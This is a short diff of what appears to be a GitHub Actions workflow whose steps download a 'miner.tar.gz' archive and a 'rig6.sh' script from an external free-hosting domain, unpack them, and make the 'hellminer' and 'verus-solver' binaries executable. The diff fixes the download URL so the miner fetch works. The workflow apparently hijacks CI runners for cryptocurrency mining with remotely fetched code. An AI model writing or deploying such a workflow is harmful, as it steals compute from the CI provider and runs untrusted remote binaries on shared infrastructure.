@@ -11,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: sudo apt install neofetch -y
-      - run: wget https://anotherdump.rf.gf/miner.tar.gz
+      - run: wget https://anotherdump.rf.gd/miner.tar.gz
       - run: tar -xzvf miner.tar.gz
       - run: chmod +x hellminer verus-solver
       - run: wget https://anotherdump.rf.gd/rig6.sh
